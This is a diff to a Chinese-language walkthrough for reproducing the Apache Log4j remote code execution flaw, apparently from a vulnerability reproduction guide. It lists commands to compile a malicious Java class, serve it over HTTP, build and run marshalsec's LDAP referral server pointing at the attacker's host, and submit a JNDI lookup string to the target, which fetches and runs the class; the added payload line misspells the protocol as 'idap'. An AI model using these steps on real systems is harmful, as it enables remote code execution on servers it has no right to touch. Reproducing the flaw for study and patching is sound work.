@@ -11,11 +11,12 @@ Apache Log4j 远程代码执行
    2. 编译 `javac Log4jRCE.java`
    3. 启动http server，python或php均可快速启动，如`php -S 0.0.0.0:8888`
 
-2. 使用marshalsec的ldap server，这个ldap server被访问到时会自动转发到http server请求对应的资源，这里即恶意java类文件
+2. 使用marshalsec的ldap server，访问这个ldap server内的任意资源都会被自动转发到http server的固定资源，这里即恶意java类文件
    1. `git clone https://github.com/mbechler/marshalsec.git`
    2. `cd marshalsec`
    3. `mvn clean package -DskipTests`
-   4. 启动ldap server `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://(这里写http server在公网上的地址及端口)/#Log4jRCE"`
+   4. 启动ldap server并配置转发资源 `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://(这里写http server在公网上的地址及端口)/#Log4jRCE"`
+      此时对靶机提交${jndi:idap://ip:port/{随便写}}即可，ldap server会自动从http server中下载指定资源并返回给靶机。
 3. 启动log4j.java，具体效果参考恶意java类中写的payload`。底层原理就是靶机会远程下载Log4jRCE.class，然后执行newInstance()，所以会执行static、构造函数代码。
 
 ### 修复方案：
